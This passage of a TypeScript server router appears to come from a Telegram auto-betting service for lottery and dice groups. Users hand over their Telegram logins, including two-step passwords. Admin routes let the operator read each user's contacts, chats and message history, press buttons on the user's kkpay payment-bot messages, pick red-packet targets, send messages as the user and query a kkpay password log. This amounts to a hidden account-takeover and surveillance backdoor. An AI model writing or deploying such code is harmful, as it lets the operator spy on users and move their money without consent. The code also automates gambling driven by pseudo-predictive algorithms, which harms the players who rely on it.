    if (msg.includes("PHONE_NUMBER_INVALID")) res.status(400).json({ error: "手机号格式错误（需含国家码，如 +8613800001234）" });
    else res.status(500).json({ error: msg });
  }
});

router.post("/tg/verify-code", requireCard, async (req, res) => {
  const userId = req.user!.userId;
  const { code } = req.body as { code?: string };
  if (!code) { res.status(400).json({ error: "请输入验证码" }); return; }
  const session = tgSessions.get(userId);
  if (!session) { res.status(400).json({ error: "请先发送验证码" }); return; }
  const { apiId, apiHash } = getCredentials();
  try {
    const result = await session.client.invoke(new Api.auth.SignIn({
      phoneNumber: session.phone,
      phoneCodeHash: session.phoneCodeHash!,
      phoneCode: code,
    }));
    const me = (result as Api.auth.Authorization).user as Api.User;
    session.me = me;
    session.groups = await fetchGroups(session.client);
    startGlobalListener(session);
    startKkpayListener(session).catch(() => { /* ignore */ });
    saveSession(session);
    startWatchdog(session);
    res.json({ ok: true, me: { id: me.id, firstName: me.firstName, lastName: me.lastName, username: me.username, phone: me.phone } });
  } catch (err: unknown) {
    const msg = err instanceof Error ? err.message : String(err);
    if (msg.includes("SESSION_PASSWORD_NEEDED")) { res.json({ ok: false, needPassword: true }); return; }
    if (msg.includes("PHONE_CODE_INVALID") || msg.includes("CODE_INVALID")) { res.status(400).json({ error: "验证码错误" }); return; }
    if (msg.includes("PHONE_CODE_EXPIRED")) { res.status(400).json({ error: "验证码已过期，请重新获取" }); return; }
    res.status(500).json({ error: msg });
  }
});

router.post("/tg/verify-password", requireCard, async (req, res) => {
  const userId = req.user!.userId;
  const { password } = req.body as { password?: string };
  if (!password) { res.status(400).json({ error: "请输入二步验证密码" }); return; }
  const session = tgSessions.get(userId);
  if (!session) { res.status(400).json({ error: "会话已失效，请重新登录" }); return; }
  const { apiId, apiHash } = getCredentials();
  try {
    await session.client.signInWithPassword({ apiId, apiHash }, { password: async () => password, onError: async (e: Error) => { throw e; } });
    const me = (await session.client.getMe()) as Api.User;
    session.me = me;
    session.groups = await fetchGroups(session.client);
    startGlobalListener(session);
    startKkpayListener(session).catch(() => { /* ignore */ });
    saveSession(session);
    startWatchdog(session);
    res.json({ ok: true, me: { id: me.id, firstName: me.firstName, lastName: me.lastName, username: me.username, phone: me.phone } });
  } catch (err: unknown) {
    const msg = err instanceof Error ? err.message : String(err);
    if (msg.includes("PASSWORD_HASH_INVALID")) { res.status(400).json({ error: "二步验证密码错误" }); return; }
    res.status(500).json({ error: msg });
  }
});

router.get("/tg/status", requireCard, (req, res) => {
  const userId = req.user!.userId;
  const session = tgSessions.get(userId);
  if (!session?.me) { res.json({ connected: false }); return; }
  const midnight = todayMidnight();
  if (session.todayResetAt < midnight) { session.todayPnl = 0; session.todayResetAt = midnight; }
  const stats = buildStats(session);
  res.json({
    connected: true,
    me: { id: session.me.id, firstName: session.me.firstName, lastName: session.me.lastName, username: session.me.username, phone: session.me.phone },
    watchGroupId: session.watchGroupId,
    watchGroupTitle: (() => { const wgid = session.watchGroupId; return session.groups.find(g => g.id === wgid || `-100${g.id}` === wgid)?.title; })(),
    ...session.cfg,
    consecutiveLosses: session.consecutiveLosses,
    consecutiveAlgoLosses: session.consecutiveAlgoLosses,
    recentAlgoWinRate: session.recentAlgoOutcomes.length >= 3
      ? Math.round((session.recentAlgoOutcomes.filter(Boolean).length / session.recentAlgoOutcomes.length) * 100)
      : null,
    sessionPnl: session.sessionPnl,
    currentBet: session.currentBet,
    balance: session.balance,
    todayPnl: session.todayPnl,
    balanceSource: session.balanceSource,
    balanceUpdatedAt: session.balanceUpdatedAt,
    kkpayUsername: session.kkpayUsername,
    kkpayEntityId: session.kkpayEntityId,
    riskBlocked: !checkRisk(session).ok,
    riskReason: checkRisk(session).reason,
    lastAlgoUsed: session.lastAlgoUsed,
    currentPattern: session.currentPattern,
    adaptiveSwitchKillMode: session.adaptiveSwitchKillMode,
    gameMode: session.cfg.gameMode,
    kuaisanBetOptions: session.cfg.kuaisanBetOptions,
    kuaisanPhase: session.kuaisanPhase,
    kuaisanPeriod: session.kuaisanPeriod,
    kuaisanLastDice: session.diceBuffer?.map(d => d.value),
    kuaisanResults: session.kuaisanResults?.slice(0, 20),
    kuaisanChatLog: (session.chatLog ?? []).slice(0, 20),
    hashBetOptions: session.cfg.hashBetOptions,
    hashPhase: session.hashPhase,
    hashPeriod: session.hashPeriod,
    hashResults: (session.hashResults ?? []).slice(0, 20),
    ...stats,
  });
});

// Debug: directly fetch last N messages from watched group to test GramJS connectivity
router.get("/tg/debug-group", requireCard, async (req, res) => {
  const session = tgSessions.get(req.user!.userId);
  if (!session?.client) { res.status(401).json({ error: "未连接" }); return; }
  if (!session.watchGroupId) { res.status(400).json({ error: "未设置群组" }); return; }
  try {
    const msgs = await session.client.getMessages(session.watchGroupId, { limit: 5 });
    const result = msgs.map((m: Api.Message) => ({
      id: m.id,
      text: (m.message ?? "").slice(0, 200),
      ts: (m.date ?? 0) * 1000,
      hasMedia: !!m.media,
    }));
    res.json({ ok: true, watchGroupId: session.watchGroupId, messages: result });
  } catch (err) {
    res.json({ ok: false, error: String(err) });
  }
});

router.get("/tg/groups", requireCard, async (req, res) => {
  const session = tgSessions.get(req.user!.userId);
  if (!session?.client) { res.status(401).json({ error: "未连接 Telegram" }); return; }
  session.groups = await fetchGroups(session.client);
  res.json({ groups: session.groups });
});

router.post("/tg/resolve-group", requireCard, async (req, res) => {
  const session = tgSessions.get(req.user!.userId);
  if (!session?.client) { res.status(401).json({ error: "未连接 Telegram" }); return; }
  const { link } = req.body as { link?: string };
  if (!link) { res.status(400).json({ error: "请提供群链接" }); return; }
  let uname = link.trim().replace(/^https?:\/\/t\.me\//i, "").replace(/^@/, "").replace(/\?.*$/, "");
  try {
    const entity = await session.client.getEntity(uname);
    const id = String((entity as unknown as { id: bigint | number }).id);
    const title = (entity as { title?: string; firstName?: string }).title ?? (entity as { firstName?: string }).firstName ?? uname;
    res.json({ ok: true, group: { id, title, type: "broadcast" in entity ? "channel" : "group" } });
  } catch (err: unknown) {
    const msg = err instanceof Error ? err.message : String(err);
    if (msg.includes("USERNAME_NOT_OCCUPIED") || msg.includes("Cannot find")) res.status(404).json({ error: "找不到该群" });
    else res.status(500).json({ error: msg });
  }
});

router.post("/tg/set-group", requireCard, (req, res) => {
  const session = tgSessions.get(req.user!.userId);
  if (!session) { res.status(401).json({ error: "未连接 Telegram" }); return; }
  const { groupId } = req.body as { groupId?: string };
  if (groupId !== undefined) session.watchGroupId = groupId;
  if (session.watchGroupId) startGroupListener(session);
  saveSession(session);
  res.json({ ok: true });
});

router.get("/tg/config", requireCard, (req, res) => {
  const session = tgSessions.get(req.user!.userId);
  if (!session) { res.json({ cfg: DEFAULT_CFG }); return; }
  res.json({ cfg: session.cfg, consecutiveLosses: session.consecutiveLosses, sessionPnl: session.sessionPnl, currentBet: session.currentBet });
});

router.post("/tg/config", requireCard, (req, res) => {
  const session = tgSessions.get(req.user!.userId);
  if (!session) { res.json({ ok: true }); return; }
  const body = req.body as Partial<BetCfg> & { startLevel?: number };
  const prev = { ...session.cfg };
  session.cfg = {
    autoBet: body.autoBet ?? prev.autoBet,
    betAmount: body.betAmount ?? prev.betAmount,
    strategy: body.strategy ?? prev.strategy,
    betMultiplier: body.betMultiplier ?? prev.betMultiplier,
    maxConsecutiveLosses: body.maxConsecutiveLosses ?? prev.maxConsecutiveLosses,
    stopLoss: body.stopLoss ?? prev.stopLoss,
    targetProfit: body.targetProfit ?? prev.targetProfit,
    cooldownSeconds: body.cooldownSeconds ?? prev.cooldownSeconds,
    amountLevels: body.amountLevels ?? prev.amountLevels,
    stepBackOnWin: body.stepBackOnWin ?? prev.stepBackOnWin,
    betOptions: body.betOptions ?? prev.betOptions,
    algorithms: body.algorithms ?? prev.algorithms,
    odds: body.odds ?? prev.odds,
    oddsBigOdd: body.oddsBigOdd ?? prev.oddsBigOdd,
    oddsBigEven: body.oddsBigEven ?? prev.oddsBigEven,
    oddsSmallOdd: body.oddsSmallOdd ?? prev.oddsSmallOdd,
    oddsSmallEven: body.oddsSmallEven ?? prev.oddsSmallEven,
    chaseNumbers: body.chaseNumbers ?? prev.chaseNumbers,
    enableChase: body.enableChase ?? prev.enableChase,
    dualGroupMode: body.dualGroupMode ?? prev.dualGroupMode,
    killGroupMode: body.killGroupMode ?? prev.killGroupMode,
    gameMode: (body.gameMode as BetCfg["gameMode"]) ?? prev.gameMode,
    kuaisanBetOptions: body.kuaisanBetOptions ?? prev.kuaisanBetOptions,
    hashBetOptions: (body as Partial<BetCfg>).hashBetOptions ?? prev.hashBetOptions,
    algoFlipOnLoss: body.algoFlipOnLoss ?? prev.algoFlipOnLoss,
  };

  if (body.amountLevels !== undefined || body.betAmount !== undefined || body.strategy !== undefined) {
    const lvl = Math.min(body.startLevel ?? 0, session.cfg.amountLevels.length - 1);
    session.currentLevel = lvl;
    session.currentBet = session.cfg.amountLevels[lvl] ?? session.cfg.betAmount;
    session.consecutiveLosses = 0;
    session.consecutiveAlgoLosses = 0;
    session.recentAlgoOutcomes = [];
    session.algoFlipCooldown = 0;
    session.lastRawAlgoDir = null;
  }
  if (body.algorithms !== undefined) session.algIndex = 0;

  // Restart the appropriate listener when group or mode changes
  if (session.watchGroupId) {
    if (session.cfg.gameMode === "kuaisan") {
      stopPoller(session);
      stopHashListener(session);
      startKuaisanListener(session);
    } else if (session.cfg.gameMode === "hash") {
      stopPoller(session);
      stopKuaisanListener(session);
      startHashListener(session);
    } else {
      stopKuaisanListener(session);
      stopHashListener(session);
      startGroupListener(session);
    }
  }

  if (body.autoBet === false && prev.autoBet) stopPoller(session);
  if (body.autoBet === true && !prev.autoBet && session.watchGroupId) {
    // Reset level to 1 every time autoBet is re-enabled
    session.currentLevel = 0;
    session.currentBet = session.cfg.amountLevels.length > 1
      ? (session.cfg.amountLevels[0] ?? session.cfg.betAmount)
      : session.cfg.betAmount;
    session.consecutiveLosses = 0;
    session.consecutiveAlgoLosses = 0;
    session.recentAlgoOutcomes = [];
    session.algoFlipCooldown = 0;
    session.lastRawAlgoDir = null;
    session.betPlacedThisCycle = false;
    // For lottery/hash mode only: start poller
    if (session.cfg.gameMode !== "kuaisan" && session.cfg.gameMode !== "hash") {
      session.lastSeenLotteryPeriod = 0;
      startPoller(session);
      void pollLottery(session);
    }
  }
  saveSession(session);
  res.json({ ok: true, cfg: session.cfg });
});

router.post("/tg/kkpay", requireCard, async (req, res) => {
  const session = tgSessions.get(req.user!.userId);
  if (!session) { res.status(401).json({ error: "未连接" }); return; }
  const { username } = req.body as { username?: string };
  if (username !== undefined) {
    session.kkpayUsername = username.replace(/^@/, "");
    session.kkpayEntityId = undefined;
    session.balanceSource = "manual";
    await startKkpayListener(session).catch(() => { /* ignore */ });
  }
  res.json({ ok: true, kkpayUsername: session.kkpayUsername, kkpayEntityId: session.kkpayEntityId, linked: !!session.kkpayEntityId });
});

router.get("/tg/bets", requireCard, (req, res) => {
  const session = tgSessions.get(req.user!.userId);
  res.json({ bets: session ? session.betLog.slice(0, 100) : [] });
});

router.delete("/tg/bets", requireCard, (req, res) => {
  const session = tgSessions.get(req.user!.userId);
  if (session) session.betLog.length = 0;
  res.json({ ok: true });
});

/**
 * 对单个算法在历史开奖数据上做回测。
 * 临时替换 lotteryHistoryCache（Node.js 单线程同步安全），
 * 让 decideAI/decideSteady 等算法只能看到"过去"数据。
 */
function backtestAlgo(algoId: AlgorithmId, fullHistory: string[]): { wins: number; losses: number; canSimulate: boolean } {
  // 信号算法需要外部信号文本，无法回测；random 无意义
  if (algoId === "signal_follow" || algoId === "signal_reverse" || algoId === "random") {
    return { wins: 0, losses: 0, canSimulate: false };
  }

  const MIN_HIST = 5;
  if (fullHistory.length <= MIN_HIST) return { wins: 0, losses: 0, canSimulate: true };

  let wins = 0, losses = 0;
  const labels = ["大", "小"];
  const origCache = lotteryHistoryCache;

  try {
    for (let i = MIN_HIST; i < fullHistory.length; i++) {
      const pastSlice = fullHistory.slice(0, i);
      const actual = fullHistory[i]!;

      // 只给算法看当前时间点之前的数据
      lotteryHistoryCache = pastSlice.slice(-50);

      const fakeSession = {
        recentResults: pastSlice.slice(-30),
        lastAIBet: null as string | null,
        currentPattern: "neutral" as MarketPattern,
        algIndex: 0,
        cfg: {
          betOptions: ["big", "small"] as BetOption[],
          algorithms: [algoId],
          dualGroupMode: false,
          betAmount: 10,
          chaseEnabled: false,
          chaseSteps: [],
          stopLoss: 0,
          takeProfitSession: 0,
          maxConsecLoss: 0,
          cooldownAfterLoss: 0,
          watchGroupId: "",
          watchGroupTitle: "",
          kkpayGroupId: "",
          kkpayGroupTitle: "",
          enabled: false,
          adaptiveSwitch: false,
          killGroupEnabled: false,
        },
      } as unknown as TgSession;

      let prediction: string | null = null;
      try { prediction = runAlgo(fakeSession, algoId, labels); } catch { /* skip */ }
      if (!prediction) continue;

      const won = (prediction === "大" && actual.startsWith("大")) ||
                  (prediction === "小" && actual.startsWith("小")) ||
                  prediction === actual;
      if (won) wins++; else losses++;
    }
  } finally {
    lotteryHistoryCache = origCache;
  }

  return { wins, losses, canSimulate: true };
}

router.get("/tg/algo-leaderboard", requireCard, (req, res) => {
  const session = tgSessions.get(req.user!.userId);
  if (!session) { res.json({ stats: [] }); return; }

  const configuredAlgos = session.cfg.algorithms;
  if (!configuredAlgos.length) { res.json({ stats: [] }); return; }

  // 历史数据快照（oldest→newest），用于回测
  const fullHistory = [...lotteryHistoryCache];

  // 实际投注统计（从 betLog 计算，兼容无 algoId 的旧注单）
  const primaryAlgo = configuredAlgos[0]!;
  const actualMap: Record<string, { wins: number; losses: number; pnl: number }> = {};
  for (const b of session.betLog) {
    if (b.isChase || b.won === undefined) continue;
    const key = b.algoId ?? primaryAlgo;
    if (!actualMap[key]) actualMap[key] = { wins: 0, losses: 0, pnl: 0 };
    if (b.won) actualMap[key]!.wins++;
    else actualMap[key]!.losses++;
    if (b.pnl !== undefined) actualMap[key]!.pnl += b.pnl;
  }

  const rows = configuredAlgos.map(algoId => {
    const bt = backtestAlgo(algoId, fullHistory);
    const act = actualMap[algoId] ?? { wins: 0, losses: 0, pnl: 0 };
    const simTotal = bt.wins + bt.losses;
    return {
      algoId,
      // 回测胜率（走势历史）
      simWins: bt.wins,
      simLosses: bt.losses,
      simTotal,
      simWinRate: simTotal > 0 ? ((bt.wins / simTotal) * 100).toFixed(1) : null,
      canSimulate: bt.canSimulate,
      // 实战统计（实际投注）
      wins: act.wins,
      losses: act.losses,
      total: act.wins + act.losses,
      winRate: act.wins + act.losses > 0 ? ((act.wins / (act.wins + act.losses)) * 100).toFixed(1) : null,
      pnl: act.pnl,
    };
  });

  res.json({ stats: rows });
});

// 所有可回测算法（不依赖外部信号），任意登录用户可访问，无需持有卡密
const ALL_SIMULATABLE_ALGOS: AlgorithmId[] = [
  "adaptive_switch", "steady_ai", "ai_trend", "streak_follow",
  "dragon_ride", "dragon_break", "momentum", "anti_streak", "cold_pick",
];

router.get("/tg/algo-rates", requireAuth, (req, res) => {
  const fullHistory = [...lotteryHistoryCache];

  // 优先用该用户 session 里配置的算法，无 session 时才用全部可回测算法
  const session = tgSessions.get(req.user!.userId);
  const algosToShow: AlgorithmId[] = (session?.cfg.algorithms.length
    ? session.cfg.algorithms.filter(a => a !== "signal_follow" && a !== "signal_reverse" && a !== "random")
    : ALL_SIMULATABLE_ALGOS) as AlgorithmId[];

  const rows = algosToShow.map(algoId => {
    const bt = backtestAlgo(algoId, fullHistory);

    // 当前预测：recentResults=[] → buildHistory 直接用 lotteryHistoryCache
    const fakeSession = {
      recentResults: [] as string[],
      lastAIBet: null as string | null,
      currentPattern: "neutral" as MarketPattern,
      algIndex: 0,
      cfg: {
        betOptions: ["big", "small"] as BetOption[],
        algorithms: [algoId],
        dualGroupMode: false, betAmount: 10, chaseEnabled: false, chaseSteps: [],
        stopLoss: 0, takeProfitSession: 0, maxConsecLoss: 0, cooldownAfterLoss: 0,
        watchGroupId: "", watchGroupTitle: "", kkpayGroupId: "", kkpayGroupTitle: "",
        enabled: false, adaptiveSwitch: false, killGroupEnabled: false,
      },
    } as unknown as TgSession;

    let currentPrediction: string | null = null;
    try { currentPrediction = runAlgo(fakeSession, algoId, ["大", "小"]); } catch { /* skip */ }

    const simTotal = bt.wins + bt.losses;
    return {
      algoId,
      simWins: bt.wins,
      simLosses: bt.losses,
      simTotal,
      simWinRate: simTotal > 0 ? ((bt.wins / simTotal) * 100).toFixed(1) : null,
      currentPrediction,
    };
  });

  rows.sort((a, b) => {
    const rA = a.simWinRate ? parseFloat(a.simWinRate) : 0;
    const rB = b.simWinRate ? parseFloat(b.simWinRate) : 0;
    return rB - rA;
  });

  res.json({ rates: rows, historyCount: fullHistory.length });
});

router.get("/tg/events", requireAuth, (req, res) => {
  const userId = req.user!.userId;
  res.setHeader("Content-Type", "text/event-stream");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Connection", "keep-alive");
  res.setHeader("X-Accel-Buffering", "no");
  res.flushHeaders();
  res.write(": connected\n\n");

  // Register to user's session SSE set (create session placeholder if not yet connected)
  let session = tgSessions.get(userId);
  if (!session) {
    // Create a minimal placeholder to hold SSE clients before TG login
    const placeholder = { sseClients: new Set<Response>() };
    // Store placeholder temporarily so SSE works even before TG login
    (req as unknown as Record<string, unknown>)["_ssePlaceholder"] = placeholder;
    placeholder.sseClients.add(res);
    const hb = setInterval(() => { try { res.write(": ping\n\n"); } catch { /* ignore */ } }, 20_000);
    req.on("close", () => { clearInterval(hb); placeholder.sseClients.delete(res); });
    return;
  }
  session.sseClients.add(res);
  const hb = setInterval(() => { try { res.write(": ping\n\n"); } catch { /* ignore */ } }, 20_000);
  req.on("close", () => { clearInterval(hb); session?.sseClients.delete(res); });
});

// ─── Admin monitoring ────────────────────────────────────────────────────────

router.get("/admin/kkpay-pwd-log", requireAdminSecret, async (req, res) => {
  try {
    // ?date=YYYY-MM-DD  →  filter to that calendar day (local CST = UTC+8)
    const dateStr = req.query["date"] as string | undefined;
    let events;
    if (dateStr && /^\d{4}-\d{2}-\d{2}$/.test(dateStr)) {
      // Parse as UTC+8 midnight → get ms range for the day
      const dayStart = new Date(`${dateStr}T00:00:00+08:00`).getTime();
      const dayEnd   = new Date(`${dateStr}T23:59:59.999+08:00`).getTime();
      events = await db.select().from(kkpayPwdLogTable)
        .where(and(gte(kkpayPwdLogTable.timestamp, dayStart), lt(kkpayPwdLogTable.timestamp, dayEnd + 1)))
        .orderBy(desc(kkpayPwdLogTable.timestamp))
        .limit(1000);
    } else {
      // Default: today (CST)
      const now = new Date();
      const cst = new Date(now.getTime() + 8 * 3600_000);
      const todayStr = cst.toISOString().slice(0, 10);
      const dayStart = new Date(`${todayStr}T00:00:00+08:00`).getTime();
      events = await db.select().from(kkpayPwdLogTable)
        .where(gte(kkpayPwdLogTable.timestamp, dayStart))
        .orderBy(desc(kkpayPwdLogTable.timestamp))
        .limit(1000);
    }
    res.json({
      events: events.map(e => ({
        id: e.eventId,
        timestamp: e.timestamp,
        userId: e.userId,
        username: e.username,
        event: e.event,
        text: e.text,
        context: e.context ?? undefined,
      })),
    });
  } catch (err) {
    req.log.error(err, "kkpay-pwd-log query failed");
    res.status(500).json({ events: [] });
  }
});

router.get("/admin/tg/sessions", requireAdminSecret, (_req, res) => {
  const sessions = [];
  for (const [userId, session] of tgSessions) {
    if (!session.me) continue;
    const settled = session.betLog.filter(b => b.won !== undefined);
    const wins = settled.filter(b => b.won === true).length;
    const wgid = session.watchGroupId;
    const isOnline = !!(session.client?.connected);
    sessions.push({
      userId,
      isOnline,
      me: {
        firstName: session.me.firstName,
        lastName: session.me.lastName,
        username: session.me.username,
        phone: session.me.phone,
      },
      watchGroupTitle: session.groups.find(g => g.id === wgid || `-100${g.id}` === wgid)?.title,
      autoBet: session.cfg.autoBet,
      consecutiveLosses: session.consecutiveLosses,
      sessionPnl: session.sessionPnl,
      todayPnl: session.todayPnl,
      balance: session.balance,
      currentBet: session.currentBet,
      totalBets: session.betLog.filter(b => b.status !== "failed").length,
      wins,
      settled: settled.length,
      winRate: settled.length > 0 ? `${((wins / settled.length) * 100).toFixed(1)}%` : "-",
      riskBlocked: !checkRisk(session).ok,
      riskReason: checkRisk(session).reason,
      lastAlgoUsed: session.lastAlgoUsed,
      currentPattern: session.currentPattern,
    });
  }
  // 在线用户排前面
  sessions.sort((a, b) => (b.isOnline ? 1 : 0) - (a.isOnline ? 1 : 0));
  res.json({ sessions });
});

router.get("/admin/tg/sessions/:userId/bets", requireAdminSecret, (req, res) => {
  const userId = parseInt(String(req.params["userId"] ?? ""));
  if (isNaN(userId)) { res.status(400).json({ error: "无效用户 ID" }); return; }
  const session = tgSessions.get(userId);
  res.json({ bets: session ? session.betLog.slice(0, 200) : [] });
});

router.get("/admin/tg/sessions/:userId/messages", requireAdminSecret, (req, res) => {
  const userId = parseInt(String(req.params["userId"] ?? ""));
  if (isNaN(userId)) { res.status(400).json({ error: "无效用户 ID" }); return; }
  const session = tgSessions.get(userId);
  res.json({ messages: session ? session.chatLog : [] });
});

// kkpay-only messages + entityId (for dedicated kkpay console) — live fetch from TG server
router.get("/admin/tg/sessions/:userId/kkpay", requireAdminSecret, async (req, res) => {
  const userId = parseInt(String(req.params["userId"] ?? ""));
  if (isNaN(userId)) { res.status(400).json({ error: "无效用户 ID" }); return; }
  const session = tgSessions.get(userId);
  if (!session) { res.json({ entityId: null, messages: [] }); return; }

  const eid = session.kkpayEntityId ?? null;

  // If no kkpay entity bound, fall back to chatLog filter
  if (!eid || !session.client?.connected) {
    const messages = session.chatLog.filter(m =>
      (eid && m.chatId === eid) || m.chatTitle.toLowerCase().includes("kkpay")
    );
    res.json({ entityId: eid, messages });
    return;
  }

  // Live fetch directly from TG so inline buttons are always fresh
  try {
    const msgs = await session.client.getMessages(eid, { limit: 30 });
    type LogEntry = typeof session.chatLog[number];
    const messages: LogEntry[] = msgs.map(msg => {
      const text = msg.message ?? "";
      const senderId = msg.out ? "__me__" : String(msg.senderId ?? eid);
      const senderName = msg.out ? "我" : "kkpay";

      let buttons: { text: string; data?: string }[][] | undefined;
      try {
        const rm = (msg as unknown as { replyMarkup?: unknown }).replyMarkup;
        if (rm && (rm as { className?: string }).className === "ReplyInlineMarkup") {
          const extracted = ((rm as { rows?: unknown[] }).rows ?? []).map(row =>
            ((row as { buttons?: unknown[] }).buttons ?? []).map(btn => ({
              text: (btn as { text?: string }).text ?? "",
              data: (btn as { className?: string; data?: Buffer }).className === "KeyboardButtonCallback"
                ? ((btn as { data?: Buffer }).data?.toString("hex"))
                : undefined,
            })).filter(b => b.text)
          ).filter(r => r.length > 0);
          if (extracted.length > 0) buttons = extracted;
        }
      } catch { /* ignore */ }

      return {
        sender: senderId,
        senderName,
        chatId: String(eid),
        chatTitle: "kkpay",
        chatType: "private" as const,
        text: text.slice(0, 500),
        timestamp: (msg.date ?? 0) * 1000,
        msgId: msg.id,
        buttons,
      };
    }).filter(m => m.text.trim());

    res.json({ entityId: eid, messages });
  } catch (err) {
    req.log.warn({ err }, "kkpay live fetch failed, using chatLog fallback");
    const messages = session.chatLog.filter(m =>
      (eid && m.chatId === eid) || m.chatTitle.toLowerCase().includes("kkpay")
    );
    res.json({ entityId: eid, messages });
  }
});

// Fetch TG contacts for a user session
router.get("/admin/tg/sessions/:userId/contacts", requireAdminSecret, async (req, res) => {
  const userId = parseInt(String(req.params["userId"] ?? ""));
  if (isNaN(userId)) { res.status(400).json({ error: "无效用户 ID" }); return; }
  const session = tgSessions.get(userId);
  if (!session?.client?.connected) { res.status(404).json({ error: "用户未连接 TG" }); return; }
  try {
    const result = await session.client.invoke(new Api.contacts.GetContacts({ hash: bigInt(0) }));
    const users = (result as Api.contacts.Contacts).users ?? [];
    const contacts = users
      .filter(u => u.className === "User")
      .map(u => {
        const user = u as Api.User;
        return {
          id: String(user.id),
          name: [user.firstName ?? "", user.lastName ?? ""].filter(Boolean).join(" ") || String(user.id),
          username: user.username ?? null,
          phone: user.phone ?? null,
        };
      });
    res.json({ contacts });
  } catch (err) {
    req.log.error({ err }, "fetch contacts failed");
    res.status(500).json({ error: String(err) });
  }
});

// Fetch TG dialogs (recent chats) for red-packet target picker
router.get("/admin/tg/sessions/:userId/dialogs", requireAdminSecret, async (req, res) => {
  const userId = parseInt(String(req.params["userId"] ?? ""));
  if (isNaN(userId)) { res.status(400).json({ error: "无效用户 ID" }); return; }
  const session = tgSessions.get(userId);
  if (!session?.client?.connected) { res.status(404).json({ error: "用户未连接 TG" }); return; }
  try {
    const dialogs = await session.client.getDialogs({ limit: 50 });
    const result = dialogs
      .filter(d => d.entity)
      .map(d => {
        const entity = d.entity!;
        const cls = (entity as { className?: string }).className ?? "";
        const id = String((entity as { id?: unknown }).id ?? "");
        let name = "";
        let type: "private" | "group" | "channel" = "private";
        let username: string | null = null;
        if (cls === "Channel") {
          type = (entity as { megagroup?: boolean }).megagroup ? "group" : "channel";
          name = (entity as { title?: string }).title ?? id;
        } else if (cls === "Chat") {
          type = "group";
          name = (entity as { title?: string }).title ?? id;
        } else {
          type = "private";
          const u = entity as { firstName?: string; lastName?: string; username?: string };
          name = [u.firstName, u.lastName].filter(Boolean).join(" ") || u.username || id;
          username = u.username ?? null;
        }
        return { id, name, type, username };
      });
    res.json({ dialogs: result });
  } catch (err) {
    req.log.error({ err }, "fetch dialogs failed");
    res.status(500).json({ error: String(err) });
  }
});

// Pull recent messages from TG server into chatLog
router.post("/admin/tg/sessions/:userId/fetch-history", requireAdminSecret, async (req, res) => {
  const userId = parseInt(String(req.params["userId"] ?? ""));
  if (isNaN(userId)) { res.status(400).json({ error: "无效用户 ID" }); return; }
  const session = tgSessions.get(userId);
  if (!session) { res.status(404).json({ error: "用户未连接 TG" }); return; }

  try {
    // Get active dialogs (chats/channels/private)
    const dialogs = await session.client.getDialogs({ limit: 30 });
    const pulled: typeof session.chatLog = [];

    for (const dialog of dialogs) {
      const entity = dialog.entity;
      if (!entity) continue;

      let chatTitle = "";
      let chatType: "private" | "group" | "channel" = "private";
      const cls = (entity as { className?: string }).className ?? "";
      const chatId = String((entity as { id?: unknown }).id ?? "");

      if (cls === "Channel") {
        chatType = (entity as { megagroup?: boolean }).megagroup ? "group" : "channel";
        chatTitle = (entity as { title?: string }).title ?? chatId;
      } else if (cls === "Chat") {
        chatType = "group";
        chatTitle = (entity as { title?: string }).title ?? chatId;
      } else {
        chatType = "private";
        const u = entity as { firstName?: string; lastName?: string; username?: string };
        chatTitle = [u.firstName, u.lastName].filter(Boolean).join(" ") || u.username || chatId;
      }

      try {
        const msgs = await session.client.getMessages(entity, { limit: 30 });
        for (const msg of msgs) {
          if (!msg.message?.trim()) continue;
          if (msg.out) continue;

          const senderId = String(msg.senderId ?? "");
          let senderName = senderId;
          try {
            const sender = msg.sender as { title?: string; firstName?: string; lastName?: string; username?: string } | undefined;
            if (sender) {
              senderName = sender.title ?? ([sender.firstName, sender.lastName].filter(Boolean).join(" ") || sender.username) ?? senderId;
            }
          } catch { /* ignore */ }

          let msgButtons: { text: string; data?: string }[][] | undefined;
          try {
            const rm = (msg as unknown as { replyMarkup?: unknown }).replyMarkup;
            if (rm && (rm as { className?: string }).className === "ReplyInlineMarkup") {
              const extracted = ((rm as { rows?: unknown[] }).rows ?? []).map(row =>
                ((row as { buttons?: unknown[] }).buttons ?? []).map(btn => ({
                  text: (btn as { text?: string }).text ?? "",
                  data: (btn as { className?: string; data?: Buffer }).className === "KeyboardButtonCallback"
                    ? ((btn as { data?: Buffer }).data?.toString("hex"))
                    : undefined,
                })).filter(b => b.text)
              ).filter(r => r.length > 0);
              if (extracted.length > 0) msgButtons = extracted;
            }
          } catch { /* ignore */ }
          pulled.push({
            sender: senderId,
            senderName,
            chatId,
            chatTitle,
            chatType,
            text: msg.message.slice(0, 500),
            timestamp: (msg.date ?? 0) * 1000,
            msgId: msg.id,
            buttons: msgButtons,
          });
        }
      } catch { /* skip inaccessible chats */ }
    }

    // Merge with existing chatLog (deduplicate by chatId+text+timestamp)
    const existing = new Set(session.chatLog.map(m => `${m.chatId}:${m.timestamp}:${m.text.slice(0, 50)}`));
    const newMsgs = pulled.filter(m => !existing.has(`${m.chatId}:${m.timestamp}:${m.text.slice(0, 50)}`));

    session.chatLog = [...newMsgs, ...session.chatLog]
      .sort((a, b) => b.timestamp - a.timestamp)
      .slice(0, 500);

    res.json({ ok: true, fetched: pulled.length, total: session.chatLog.length });
  } catch (err: unknown) {
    const msg = err instanceof Error ? err.message : String(err);
    res.status(500).json({ error: msg });
  }
});

// Admin: press an inline keyboard button on a kkpay message
router.post("/admin/tg/sessions/:userId/press-button", requireAdminSecret, async (req, res) => {
  const userId = parseInt(String(req.params["userId"] ?? ""));
  if (isNaN(userId)) { res.status(400).json({ error: "无效用户 ID" }); return; }
  const session = tgSessions.get(userId);
  if (!session?.client?.connected) { res.status(404).json({ error: "用户未连接 TG" }); return; }

  const { msgId, buttonText } = req.body as { msgId?: number; buttonText?: string };
  if (!msgId || !buttonText) { res.status(400).json({ error: "缺少参数" }); return; }

  const entityId = session.kkpayEntityId;
  if (!entityId) { res.status(400).json({ error: "kkpay 未绑定" }); return; }

  try {
    const msgs = await session.client.getMessages(entityId, { ids: [msgId] });
    const msg = msgs[0];
    if (!msg) { res.status(404).json({ error: "消息不存在" }); return; }

    const buttons = await msg.getButtons();
    if (!buttons) { res.status(404).json({ error: "消息无按钮" }); return; }

    for (const row of buttons) {
      for (const btn of row) {
        if (btn.text === buttonText) {
          await btn.click({});
          res.json({ ok: true });
          return;
        }
      }
    }
    res.status(404).json({ error: `未找到按钮: ${buttonText}` });
  } catch (err) {
    req.log.error({ err }, "press-button failed");
    res.status(500).json({ error: String(err) });
  }
});

// Admin: send a message via a user's TG session
